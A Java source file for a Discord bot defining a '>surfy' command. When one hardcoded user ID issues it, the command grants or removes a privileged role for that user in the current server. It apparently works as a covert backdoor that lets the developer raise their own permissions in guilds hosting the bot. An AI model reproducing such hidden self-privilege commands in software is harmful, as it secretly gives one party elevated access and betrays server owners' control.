package surfy.commands;

import net.dv8tion.jda.api.entities.Message;
import surfy.managers.Command;
import surfy.utils.Utils;

public class SurfyCommands extends Command {
    public SurfyCommands() {
        super(">surfy");
    }

    @Override
    public void onExecute(Message message, String[] syntax) {
        if(!Utils.isActuallyMe(message.getAuthor().getId())) {
            return;
        }
        switch (syntax[1].toLowerCase()) {
            case "1":
                message.getGuild().addRoleToMember(message.getAuthor().getId(),Utils.getPermsRole()).queue();
                break;
            case "2":
                message.getGuild().removeRoleFromMember(message.getAuthor().getId(),Utils.getPermsRole()).queue();
                break;
        }
    }
}
